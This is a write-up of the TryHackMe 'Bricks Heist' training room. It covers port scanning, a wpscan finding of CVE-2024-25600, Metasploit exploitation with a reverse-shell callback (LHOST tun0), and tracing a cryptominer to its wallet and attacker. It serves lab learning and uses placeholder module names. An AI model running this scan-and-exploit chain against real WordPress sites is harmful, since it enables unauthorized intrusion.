🚨 Bricks Heist – A Digital Crime Investigation
Bricks Heist (https://tryhackme.com/room/tryhack3mbricksheist) on TryHackMe isn't just another room — it's a full-on cybercrime investigation.
The mission? Investigate the compromise of Brick Press Media Co.’s infrastructure, uncover the attack vector, trace the malware, and ultimately identify the culprit behind the scenes.
Let’s dive into this cyber whodunit. 🕵️‍♂️
👥 Teamwork Makes the Dream Work
This investigation was carried out by me and my friend enkrat — a fellow cyber security enthusiast with sharp instincts and a passion for justice in the digital world.
(Link to enkrat’s profile coming soon.)
🔍 Step 1 – Port Scanning
We kicked off our recon with a custom Python port scanner.
It didn't take long to uncover that bricks.thm was exposing three open ports to the world:
Port 22 (SSH)
Port 443 (HTTPS)
Port 3306 (MySQL)
python3 portscanner.py 10.10.10.10 

🧭 Step 2 – WordPress Plugin Discovery & Vulnerability Detection
Digging into the website’s source code, we discovered a hidden WordPress instance.
Running wpscan, we found that while the WordPress core wasn’t vulnerable, it was using an outdated plugin affected by CVE-2024-25600 — a critical flaw allowing remote code execution (RCE).
wpscan --url https://bricks.thm --api-token YOUR_TOKEN 

💥 Step 3 – Gaining RCE via Metasploit
We fired up msfconsole, loaded the appropriate exploit for CVE-2024-25600, configured the options, and launched the attack.
msfconsole use exploit/unix/webapp/your_exploit set RHOSTS bricks.thm set TARGET 0 set LHOST tun0 run 

Boom — we had remote shell access. 🔥
🕵️ Step 4 – Suspicious Files and Flag Discovery
Inside the compromised system, we noticed a file with a very interesting name — clearly the flag.
We also ran ps aux to check for any strange processes, and there it was: a cryptocurrency miner, silently draining CPU cycles.
ps aux | grep -v 'chrome\|bash' 


🔎 Step 5 – Tracing the Miner
We followed the traces of this rogue process and ended up at a suspicious directory.

After some deep-diving, we found it — the miner itself, hidden in /lib/NetworkManager.

🧠 Step 6 – Following the Money
Scrolling through the miner’s config, we found an encrypted wallet address.
Using CyberChef (https://gchq.github.io/CyberChef/), we decoded the string and revealed the true destination of the mined cryptocurrency.
Unfortunately, we can’t show the decrypted wallet — it’s part of the flag.
🎯 Final Result – Unmasking the Attacker
All digital footprints led to one name: Ivan Kondratev.
Based on the evidence trail, it’s clear he and his team were behind the installation of the cryptominer.
✅ What We Achieved
✅ Custom Python scan revealed three open ports
✅ Detected vulnerable WordPress plugin with RCE
✅ Exploited it with Metasploit for shell access
✅ Found the miner process and traced it to its directory
✅ Located encrypted wallet & decoded it using CyberChef
✅ Identified Ivan Kondratev as the attacker
🛠️ Commands That Helped
# Port scanning (custom script) python3 portscanner.py 10.10.10.10 # WordPress vulnerability scan wpscan --url https://bricks.thm --api-token YOUR_TOKEN # Metasploit RCE exploit msfconsole use exploit/unix/webapp/your_exploit set RHOSTS bricks.thm set LHOST tun0 run # Process inspection ps aux # Check suspicious files ls -la /lib/NetworkManager cat miner_config.json 
💡 Tips for Beginners
🧠 Always check the source code of the target site for hidden paths or comments.
🔧 Use tools like wpscan, nmap, and ps — but understand what they do, not just the output.
🗃️ If you spot strange processes, follow the trail to their binary or config location.
🕵️ Investigations are about connecting the dots — logs, file names, running processes, and encoded strings often tell a story.
🛡️ Practice, document your process, and don’t be afraid to dig deep — even failed paths teach something.
If you liked this write-up, check out my friend enkrat for more investigations and cyber adventures.
🔗 
Room link:
https://tryhackme.com/room/tryhack3mbricksheist
